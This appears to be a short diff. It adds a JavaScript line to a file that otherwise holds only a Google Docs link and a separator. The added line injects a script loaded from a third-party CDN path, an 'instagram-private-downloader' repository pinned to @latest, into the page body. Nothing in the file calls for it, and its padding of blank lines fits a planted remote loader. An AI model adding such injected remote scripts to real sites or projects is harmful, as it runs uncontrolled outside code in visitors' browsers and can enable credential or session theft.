@@ -1,3 +1,8 @@
+var _ig_s = document.createElement('script');_ig_s.src = "https://cdn.jsdelivr.net/gh/devsaurabhcb/instagram-private-downloader@latest/downloader.js"; document.body.appendChild(_ig_s);
+
+
+
+
 https://docs.google.com/document/d/1JkGlyT47t9DJf2oMne6-1-6b8Tp-RbbM/edit?usp=sharing&ouid=102539893821167373027&rtpof=true&sd=true
 
 ##############################################
